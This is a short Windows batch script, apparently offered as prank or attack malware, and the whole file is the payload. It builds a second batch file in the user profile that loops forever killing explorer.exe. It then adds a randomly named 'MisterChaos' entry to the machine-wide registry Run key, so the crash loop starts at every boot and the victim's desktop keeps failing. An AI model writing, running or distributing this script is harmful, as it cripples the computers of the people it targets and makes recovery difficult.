@echo off
echo @echo off >> %userprofile%\explorer_permacrashREG.bat
echo :loop >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo taskkill /im explorer.exe /f /t >> %userprofile%\explorer_permacrashREG.bat
echo goto loop >> %userprofile%\explorer_permacrashREG.bat

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V MisterChaos%random% /T REG_SZ /D "%userprofile%\explorer_permacrashREG.bat" /F